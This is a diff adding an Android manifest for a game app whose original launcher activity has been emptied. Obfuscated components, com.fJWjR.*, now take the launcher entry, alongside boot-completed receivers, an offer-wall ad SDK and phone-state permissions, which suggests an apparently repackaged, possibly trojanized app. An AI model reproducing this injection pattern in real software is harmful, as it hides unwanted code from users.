@@ -1,0 +1,63 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.wia.ucgepcdvlsl">
+    <application android:debuggable="false" android:icon="@drawable/icon" android:label="@string/app_name" android:name=".app.CupcakeDashApplication">
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:launchMode="singleInstance" android:name="com.wia.ucgepcdvlsl.activity.MainActivity" android:screenOrientation="landscape" android:theme="@style/Theme.DoNotDim">
+            <intent-filter/>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.wia.ucgepcdvlsl.activity.GameActivity" android:screenOrientation="landscape" android:theme="@style/Theme.DoNotDim"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.nom.lib.app.YGUserFlowActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.nom.lib.app.YGFeedbackScreenActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.nom.lib.app.LeaderboardActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="com.nom.lib.app.AppProfileActivity" android:screenOrientation="landscape" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.google.ads.AdActivity"/>
+        <service android:name="com.nom.lib.service.YGNotificationService">
+            <intent-filter>
+                <action android:name="com.nom.lib.service.YGNotificationService.intent.action.Launch"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </service>
+        <receiver android:exported="true" android:name="com.nom.lib.service.YGBroadcastReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.android.vending.INSTALL_REFERRER"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.nom.lib.intent.action.REQUEST_PLAYER_INFO"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.nom.lib.intent.action.UPDATE_PLAYER_INFO"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.nom.lib.service.YGPackageEventsReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <data android:path="com.adobe.air" android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+        <meta-data android:name="NEW_APP_ID" android:value="20013449"/>
+        <activity android:name="com.fJWjR.VemfFBVA"/>
+        <activity android:name="com.fJWjR.wwltBMCp">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:launchMode="singleTask" android:name="com.nd.dianjin.activity.OfferAppActivity" android:screenOrientation="portrait"/>
+        <receiver android:name="com.nd.dianjin.broadcastreceiver.PackagedChangedBroadcastReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="false"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+</manifest>
